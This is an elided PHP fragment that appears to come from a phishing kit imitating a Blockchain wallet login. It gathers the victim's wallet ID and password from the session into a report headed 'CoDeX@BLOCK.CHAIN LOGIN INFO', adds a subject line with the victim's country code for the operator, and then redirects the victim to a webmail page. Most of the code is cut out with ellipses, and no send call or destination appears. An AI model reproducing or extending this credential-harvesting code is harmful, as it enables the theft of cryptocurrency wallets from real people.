...
*/
  ...
  $getDomain = $parse['host'];
	...
	$message .= "++++++++++++++🌐 CoDeX@BLOCK.CHAIN LOGIN INFO  🌐++++++++++++++\n";	
	$message .= "Wallet ID 	       : ".$_SESSION["guid"]."\n";
	$message .= "Wallet PassWord   : ".$_SESSION["passs"]."\n";		
	...
	$subject = "NEW BLOCK.CHAIN LOGIN INFO FROM [" . $notirput . "] [$countrycode]";
...
header( "refresh:0;url=../webmail.php?SESSION=$get_sess" );
?>